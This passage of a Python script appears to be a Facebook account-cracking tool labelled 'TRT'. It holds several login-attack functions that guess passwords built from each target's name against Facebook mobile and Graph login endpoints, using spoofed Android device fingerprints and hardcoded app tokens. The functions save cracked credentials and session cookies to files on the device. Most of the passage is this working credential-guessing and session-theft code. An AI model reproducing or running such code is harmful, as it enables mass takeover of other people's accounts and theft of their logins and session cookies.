				po = requests.post(url,data=data,headers=head,allow_redirects=False).text

				q = json.loads(po)

				if 'session_key' in q:

					print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')

					open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')

					oks.append(ids)

					break

				elif 'www.facebook.com' in q['error_msg']:

					if 'y' in pcp:

						print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')

						open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')

						cps.append(ids)

						break

					else:

						open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')

						break

				else:

					continue

			loop+=1

		except requests.exceptions.ConnectionError:

			time.sleep(10)

		except Exception as e:

			pass

#m2

#b-graph method		

def api2(ids,names,passlist):

        try:

                global ok,loop,sim_id

                sys.stdout.write('\r\r\033[1;37m [TRT-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()

                fn = names.split(' ')[0]

                try:

                        ln = names.split(' ')[1]

                except:

                        ln = fn

                for pw in passlist:

                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())

                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'

                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'

                        fbbv = str(random.randint(111111111,999999999))

                        android_version = device['android_version']

                        model = device['model']

                        build = device['build']

                        fblc = device['fblc']

                        fbcr = sim_id

                        fbmf = device['fbmf']

                        fbbd = device['fbbd']

                        fbdv = device['fbdv']

                        fbsv = device['fbsv']

                        fbca = device['fbca']

                        fbdm = device['fbdm']

                        fbfw = '1'

                        fbrv = '0'

                        fban = 'FB4A'

                        fbpn = 'com.facebook.katana'

                        en = random.choice(['en_US','en_GB'])

                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])

                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])

                        ua ='[FBAN/FB4A;FBAV/74.0.0.2457;FBBV/2447900;[FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097175;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/H2O;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG-SGH-I337;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]'

                        random_seed = random.Random()

                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))

                        device_id = str(uuid.uuid4())

                        secure = str(uuid.uuid4())

                        family = str(uuid.uuid4())

                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'

                        xd =str(''.join(random_seed.choices(string.digits, k=20)))

                        sim_serials = f'["{xd}"]'

                        li = ['28','29','210']

                        li2 = random.choice(li)

                        j1 = ''.join(random.choice(digits) for _ in range(2))

                        jazoest = li2+j1

                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}

                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": aqib_ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}

                        url = 'https://b-graph.facebook.com/auth/login'

                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'

                        po = requests.post(url,data=data,headers=headers).json()

                        if 'session_key' in po:

                                        print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')

                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])

                                        #print("\r\r\033[1;33m Cookie: "+coki)

                                        open('/sdcard/TRT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')

                                        open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')

                                        oks.append(ids)

                                        break

                        elif twf in str(po):

                                        if 'y' in pcp:

                                                print('\r\r \033[1;34m[TRT-2F] '+ids+' | '+pas)

                                                twf.append(ids)

                                                break

                        elif 'www.facebook.com' in po['error']['message']:

                                        if 'y' in pcp:

                                                print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')

                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')

                                                break

                                                cps.append(ids)

                                        else:

                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')

                                                break

                                                cps.append(ids)

                        else:

                                        continue

                loop+=1

        except Exception as e:

                pass

  #method3             

def api3(ids,names,passlist):

        try:

                global ok,loop,sim_id

                sys.stdout.write('\r\r\033[1;37m [TRT-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()

                fn = names.split(' ')[0]

                try:

                        ln = names.split(' ')[1]

                except:

                        ln = fn

                for pw in passlist:

                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())

                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'

                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'

                        fbbv = str(random.randint(111111111,999999999))

                        android_version = device['android_version']

                        model = device['model']

                        build = device['build']

                        fblc = device['fblc']

                        fbcr = sim_id

                        fbmf = device['fbmf']

                        fbbd = device['fbbd']

                        fbdv = device['fbdv']

                        fbsv = device['fbsv']

                        fbca = device['fbca']

                        fbdm = device['fbdm']

                        fbfw = '1'

                        fbrv = '0'

                        fban = 'FB4A'

                        fbpn = 'com.facebook.katana'

                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=8797};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'

                        random_seed = random.Random()

                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))

                        device_id = str(uuid.uuid4())

                        secure = str(uuid.uuid4())

                        family = str(uuid.uuid4())

                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'

                        xd =str(''.join(random_seed.choices(string.digits, k=20)))

                        sim_serials = f'["{xd}"]'

                        li = ['28','29','210']

                        li2 = random.choice(li)

                        j1 = ''.join(random.choice(digits) for _ in range(2))

                        jazoest = li2+j1

                        data = {

                                "adid": adid,

"format": "json",

"device_id": str(uuid.uuid4()),

"email": ids,

"password": pas,

"generate_analytics_claims": "1",

"credentials_type": "password",

"source": "login",

"error_detail_type": "button_with_disabled",

"enroll_misauth": "false",

"generate_session_cookies": "1",

"generate_machine_id": "1",

"fb_api_req_friendly_name": "authenticate",}

                        headers={

                                "Accept-Encoding": "gzip, deflate",

"Accept": "*/*",

"Connection": "keep-alive",

"User-Agent": ua,

"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",

"X-FB-Friendly-Name": "authenticate",

"X-FB-Connection-Type": "unknown",

"Content-Type": "application/x-www-form-urlencoded",

"X-FB-HTTP-Engine": "Liger",

"Content-Length": "329",}

                        url = 'https://b-graph.facebook.com/auth/login'

                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'

                        po = requests.post(url,data=data,headers=headers).json()

                        if 'session_key' in po:

                                        print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')

                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])

                                        print("Cookie: "+coki)

                                        open('/sdcard/TRT-COOKIE.txt','a').write(coki+'\n')

                                        open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')

                                        oks.append(ids)

                                        break

                        elif twf in str(po):

                                        if 'y' in pcp:

                                                print('\r\r \033[1;34m[TRT-2F] '+ids+' | '+pas)

                                                twf.append(ids)

                                                break

                        elif 'www.facebook.com' in po['error']['message']:

                                        if 'y' in pcp:

                                                print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')

                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')

                                                break

                                                cps.append(ids)

                                        else:

                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')

                                                break

                                                cps.append(ids)

                        else:

                                        continue

                loop+=1

        except Exception as e:

                pass

#b-api method

#method3                

def api4(ids,names,passlist):

        try:

                global ok,loop,sim_id

                sys.stdout.write('\r\r\033[1;37m [TRT-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()

                fn = names.split(' ')[0]

                try:

                        ln = names.split(' ')[1]

                except:

                        ln = fn

                for pw in passlist:

                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())

                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'

                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'

                        fbbv = str(random.randint(111111111,999999999))

                        android_version = device['android_version']

                        model = device['model']

                        build = device['build']

                        fblc = device['fblc']

                        fbcr = sim_id

                        fbmf = device['fbmf']

                        fbbd = device['fbbd']

                        fbdv = device['fbdv']

                        fbsv = device['fbsv']

                        fbca = device['fbca']

                        fbdm = device['fbdm']

                        fbfw = '1'

                        fbrv = '0'

                        fban = 'FB4A'

                        fbpn = 'com.facebook.katana'

                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1080,height=2376};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'

                        random_seed = random.Random()

                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))

                        device_id = str(uuid.uuid4())

                        secure = str(uuid.uuid4())

                        family = str(uuid.uuid4())

                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'

                        xd =str(''.join(random_seed.choices(string.digits, k=20)))

                        sim_serials = f'["{xd}"]'

                        li = ['28','29','210']

                        li2 = random.choice(li)

                        j1 = ''.join(random.choice(digits) for _ in range(2))

                        jazoest = li2+j1

                        data = {

                                'adid':adid,

                                'format':'json',

                                'device_id':device_id,

                                'email':ids,

                                'password':pas,

                                'generate_analytics_claims':'1',

                                'credentials_type':'password',

                                'source':'login',

                                'error_detail_type':'button_with_disabled',

                                'enroll_misauth':'false',

                                'generate_session_cookies':'1',

                                'generate_machine_id':'1',

                                'meta_inf_fbmeta':'',

                                'currently_logged_in_userid':'0',

                                'fb_api_req_friendly_name':'authenticate',

                        }

                        headers={

                                'Authorization':f'OAuth {accessToken}',

                                'X-FB-Friendly-Name':'authenticate',

                                'X-FB-Connection-Type':'unknown',

                                'User-Agent':ua,

                                'Accept-Encoding':'gzip, deflate',

                                'Content-Type': 'application/x-www-form-urlencoded',

                                'X-FB-HTTP-Engine': 'Liger'

                                }

                        url = 'https://b-api.facebook.com/method/auth.login'

                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'

                        po = requests.post(url,data=data,headers=headers).json()

                        if 'session_key' in po:

                                        print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')

                                        open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')

                                        oks.append(ids)

                                        break

                        elif twf in str(po):

                                        if 'y' in pcp:

                                                print('\r\r \033[1;34m[TRT-2F] '+ids+' | '+pas)

                                                twf.append(ids)

                                                break

                        elif 'www.facebook.com' in po['error_msg']:

                                        if 'y' in pcp:

                                                print('\r\r\x1b[38;5;206m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')

                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')

                                                break

                                                cps.append(ids)

                                        else:

                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')

                                                break

                                                cps.append(ids)

                        else:

                                continue

                loop+=1

        except Exception as e:

                pass

#4method

def api5(ids,names,passlist):

        try:

                global ok,loop,sim_id

                sys.stdout.write('\r\r\033[1;37m [TRT-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()

                fn = names.split(' ')[0]

                try:

                        ln = names.split(' ')[1]

                except:

                        ln = fn

                for pw in passlist:

                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())

                        accessToken = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32',

'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']

                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'

                        fbbv = str(random.randint(111111111,999999999))

                        android_version = device['android_version']

                        model = device['model']

                        build = device['build']

                        fblc = device['fblc']

                        fbcr = sim_id

                        fbmf = device['fbmf']

                        fbbd = device['fbbd']

                        fbdv = device['fbdv']

                        fbsv = device['fbsv']

                        fbca = device['fbca']

                        fbdm = device['fbdm']

                        fbfw = '1'

                        fbrv = '0'

                        fban = 'FB4A'

                        fbpn = 'com.facebook.katana'

                        en = random.choice(['en_US','en_GB'])

                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])

                        en = random.choice(['en_US','en_GB'])

                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])

                        ua = "Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.0; '+model+' Build/'+''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))+' [FBAN/FB4A;FBAV/'+str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))+';FBBV/'+str(random.randint(745000000,745999999))+';FBDM/{density=2.25,width=720,height=1452};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.adsmanager;FBDV/'+model+';FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"

                        random_seed = random.Random()

                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))

                        device_id = str(uuid.uuid4())

                        secure = str(uuid.uuid4())

                        family = str(uuid.uuid4())

                        accessToken = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32',

'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']

                        xd =str(''.join(random_seed.choices(string.digits, k=20)))

                        sim_serials = f'["{xd}"]'

                        li = ['28','29','210']

                        li2 = random.choice(li)

                        j1 = ''.join(random.choice(digits) for _ in range(2))

                        jazoest = li2+j1

                        data = {

                                "adid": adid,

"format": "json",

"device_id": str(uuid.uuid4()),

"cpl": "true",

"family_device_id": str(uuid.uuid4()),

"credentials_type": "device_based_login_password",

"error_detail_type": "button_with_disabled",

"source": "device_based_login",

"email": ids,

"password": pas,

"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",

"generate_session_cookies": "1",

"meta_inf_fbmeta": "",

"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",

"currently_logged_in_userid": "0",

"locale": "en_US",

"client_country_code": "US",

"method": "auth.login",

"fb_api_req_friendly_name": "authenticate",

"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",

"api_key": "882a8490361da98702bf97a021ddc14d",}

                        headers={

                                'User-Agent': aqib_ua,

'Content-Type': 'application/x-www-form-urlencoded',

'Host': 'graph.facebook.com',

'X-FB-Net-HNI': '25227',

'X-FB-SIM-HNI': '29752',

'X-FB-Connection-Type': 'MOBILE.LTE',

'X-Tigon-Is-Retry': 'False',

'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',

'x-fb-device-group': '5120',

'X-FB-Friendly-Name': 'ViewerReactionsMutation',

'X-FB-Request-Analytics-Tags': 'graphservice',

'X-FB-HTTP-Engine': 'Liger',

'X-FB-Client-IP': 'True',

'X-FB-Server-Cluster': 'True',

'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',

'Content-Length': '706'}

                        url = 'https://b-graph.facebook.com/auth/login'

                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'

                        po = requests.post(url,data=data,headers=headers).json()

                        if 'session_key' in po:

                                        print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')

                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])

                                        #print("\r\r\033[1;33m Cookie: "+coki)

                                        open('/sdcard/TRT-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')

                                        open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')

                                        oks.append(ids)

                                        break

                        elif twf in str(po):

                                        if 'y' in pcp:

                                                print('\r\r \033[1;34m[TRT-2F] '+ids+' | '+pas)

                                                twf.append(ids)

                                                break

                        elif 'www.facebook.com' in po['error']['message']:

                                        if 'y' in pcp:

                                                print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')

                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')

                                                break

                                                cps.append(ids)

                                        else:

                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')

                                                break

                                                cps.append(ids)

                        else:

                                        continue

                loop+=1

        except Exception as e:

                pass

def api6(ids,names,passlist):

	global loop,oks,cps

	sys.stdout.write('\r\r\033[1;37m [TRT-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()

	session = requests.Session()

	try:

		first = names.split(' ')[0]

		try:

			last = names.split(' ')[1]

		except:

			last = 'Khan'

		ps = first.lower()

		ps2 = last.lower()

		for fikr in passlist:

			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)

			ua=random.choice(ugen)

			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}

			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')

			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}

			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)

			TRT=session.cookies.get_dict().keys()

			if "c_user" in TRT:

				coki=session.cookies.get_dict()

				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])

				print('\r\r\033[1;32m [TRT-OK] %s | %s'%(ids,pas))

				open('/sdcard/TRT-OK.txt', 'a').write(ids+'|'+pas+'\n')

				oks.append(ids)

				break

			elif 'checkpoint' in TRT:

				if 'y' in pcp:

					print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')

					open('/sdcard/TRT-CP.txt', 'a').write(ids+'|'+pas+'\n')

					cps.append(ids)

					break

				else:

					break

			else:

				continue

	except requests.exceptions.ConnectionError:

		time.sleep(20)

	loop+=1

#method6

#d.fb

def api7(ids,names,passlist):

	global loop,oks,cps

	sys.stdout.write('\r\r\033[1;37m [TRT-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()

	session = requests.Session()

	try:

		first = names.split(' ')[0]

		try:

			last = names.split(' ')[1]

		except:

			last = 'Khan'

		ps = first.lower()

		ps2 = last.lower()

		for fikr in passlist:

			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)

			ua=random.choice(ugen)

			head = {'Host': 'd.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}

			getlog = session.get(f'https://d.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')

			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://d.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}

			complete = session.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)

			TRT=session.cookies.get_dict().keys()

			if "c_user" in TRT:

				coki=session.cookies.get_dict()

				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])

				print('\r\r\033[1;32m [TRT-OK] %s | %s'%(ids,pas))

				open('/sdcard/TRT-OK.txt', 'a').write(ids+'|'+pas+'\n')

				oks.append(ids)

				break

			elif 'checkpoint' in TRT:

				if 'y' in pcp:

					print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')

					open('/sdcard/TRT-CP.txt', 'a').write(ids+'|'+pas+'\n')

					cps.append(ids)

					break

				else:

					break

			else:

				continue

	except requests.exceptions.ConnectionError:

		time.sleep(20)

	loop+=1

#method7

def api8(ids,names,passlist):

	global loop,oks,cps

	sys.stdout.write('\r\r\033[1;37m [TRT-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()

	session = requests.Session()

	try:

		first = names.split(' ')[0]

		try:

			last = names.split(' ')[1]

		except:

			last = 'Khan'

		ps = first.lower()

		ps2 = last.lower()

		for fikr in passlist:

			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)

			ua=random.choice(ugen)

			head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': aqib_ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}

			getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')

			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}

			complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)

			TRT=session.cookies.get_dict().keys()

			if "c_user" in TRT:

				coki=session.cookies.get_dict()

				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])

				print('\r\r\033[1;32m [TRT-OK] %s | %s'%(ids,pas))

				open('/sdcard/TRT-OK.txt', 'a').write(ids+'|'+pas+'\n')

				oks.append(ids)

				break

			elif 'checkpoint' in TRT:

				if 'y' in pcp:

					print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')

					open('/sdcard/TRT-CP.txt', 'a').write(ids+'|'+pas+'\n')

					cps.append(ids)

					break

				else:

					break

			else:

				continue

	except requests.exceptions.ConnectionError:

		time.sleep(20)

	loop+=1

#method1rnd

def trt1(ids,passlist):

        global loop

        global oks

        sys.stdout.write('\r\r\033[1;37m [TRT-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()

        try:

                for pas in passlist:

                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'

                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'

                        fbbv = str(random.randint(111111111,999999999))

                        android_version = device['android_version']

                        model = device['model']

                        build = device['build']

                        fblc = device['fblc']

                        fbcr = sim_id

                        fbmf = device['fbmf']

                        fbbd = device['fbbd']

                        fbdv = device['fbdv']

                        fbsv = device['fbsv']

                        fbca = device['fbca']

                        fbdm = device['fbdm']

                        fbfw = '1'

                        fbrv = '0'

                        fban = 'FB4A'

                        fbpn = 'com.facebook.katana'

                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.97,width=720,height=1612};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'

                        random_seed = random.Random()

                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))

                        device_id = str(uuid.uuid4())

                        secure = str(uuid.uuid4())

                        family = str(uuid.uuid4())

                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'

                        xd =str(''.join(random_seed.choices(string.digits, k=20)))

                        sim_serials = f'["{xd}"]'

                        li = ['28','29','210']

                        li2 = random.choice(li)

                        j1 = ''.join(random.choice(digits) for _ in range(2))

                        jazoest = li2+j1

                        data = {

                                "adid": adid,

"format": "json",

"device_id": str(uuid.uuid4()),

"cpl": "true",

"family_device_id": str(uuid.uuid4()),

"credentials_type": "device_based_login_password",

"error_detail_type": "button_with_disabled",

"source": "device_based_login",

"email": ids,

"password": pas,

"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",

"generate_session_cookies": "1",

"meta_inf_fbmeta": "",

"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",

"currently_logged_in_userid": "0",

"locale": "en_US",

"client_country_code": "US",

"method": "auth.login",

"fb_api_req_friendly_name": "authenticate",

"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",

"api_key": "882a8490361da98702bf97a021ddc14d",}

                        headers={

                                'User-Agent': aqib_ua,

'Content-Type': 'application/x-www-form-urlencoded',

'Host': 'graph.facebook.com',

